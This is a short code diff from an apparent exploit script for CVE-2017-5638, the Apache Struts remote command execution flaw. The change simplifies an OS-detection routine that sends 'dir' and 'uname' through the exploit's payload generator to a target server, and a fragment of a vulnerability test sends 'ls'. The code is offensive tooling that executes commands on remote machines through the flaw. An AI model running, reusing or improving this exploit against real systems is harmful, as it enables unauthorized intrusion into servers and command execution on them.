@@ -101,15 +101,12 @@ class CVE_2017_5638():
         return body
 
     def os_detect(self):
-        cmds = ['dir', 'uname']
-        for cmd in cmds:
-            resp = self.send_xpl(self.generate_payload(cmd))
-            if '<DIR>' in resp:
-                print '[+] Windows OS system detected.'
-                break
-            elif 'Linux' in resp or 'Darwin' in resp:
-                print '[+] Unix-like OS system detected.\n'
-                break
+        cmd = 'uname'
+        resp = self.send_xpl(self.generate_payload(cmd))
+        if 'Linux' in resp or 'Darwin' in resp:
+            print '[+] Unix-like OS system detected.\n'
+        else:
+            print '[+] Windows OS system detected.\n'
 
     def test_vuln(self):
         cmd = 'ls'
